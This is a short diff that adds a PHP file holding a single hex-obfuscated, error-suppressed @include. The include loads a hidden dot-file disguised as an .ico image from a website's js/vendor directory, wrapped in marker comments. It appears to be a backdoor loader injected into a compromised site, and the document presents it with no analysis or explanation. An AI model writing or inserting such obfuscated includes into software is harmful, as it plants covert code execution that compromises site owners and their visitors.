@@ -1,0 +1,7 @@
+<?php
+/*780d2*/
+
+@include "\x2fhom\x65/86\x3715/\x64oma\x69ns/\x6cast\x72ona\x75tga\x6de.c\x6fm/h\x74ml/\x6as/v\x65ndo\x72/.2\x63c1f\x3205.\x69co";
+
+/*780d2*/
+
